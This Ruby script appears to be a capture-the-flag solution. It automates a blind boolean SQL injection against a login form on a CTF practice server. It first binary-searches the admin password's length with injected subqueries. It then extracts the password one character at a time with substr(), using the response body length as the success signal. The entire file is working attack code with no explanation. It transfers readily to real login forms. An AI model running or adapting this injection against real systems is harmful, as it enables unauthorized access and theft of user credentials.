require 'net/http'

module Login
  @@uri = URI.parse 'http://ctfq.sweetduet.info:10080/~q6/'

  def self.analysis_password_length
    lenMin = 1
    lenMax = 100
    passLen = 0

    while (lenMax - lenMin) > 1
      passLen = (lenMin + lenMax).div(2).to_i

      begin
        res = Net::HTTP.post_form @@uri, { "id" => "' or (SELECT length(pass) FROM user WHERE id='admin') <= #{passLen}--" }
      rescue Net::ReadTimeout
        retry
      end

      if self.isCorrectResponse res
        lenMax = passLen
      else
        lenMin = passLen
      end
    end

    puts "password length : #{passLen}"

    return passLen
  end

  def self.analysis_password passLen
    pass = ""

    (6..passLen).each do |n|
      (48..122).each do |chCode|
        c = chCode.chr

        next if c =~ /\W/

        begin
          res = Net::HTTP.post_form @@uri, { "id" => "' or substr((SELECT pass FROM user WHERE id='admin'), #{n}, 1)=\"#{c}\"--" }
        rescue Net::ReadTimeout
          retry
        end

        if self.isCorrectResponse res
          pass << c
          puts "hit!! #{n}:#{c}"
          break
        end
      end
    end

    puts "password : #{pass}"
  end

  def self.isCorrectResponse res
    return res.body.length == 2167
  end
end

#len = Login.analysis_password_length
len = 21
Login.analysis_password len

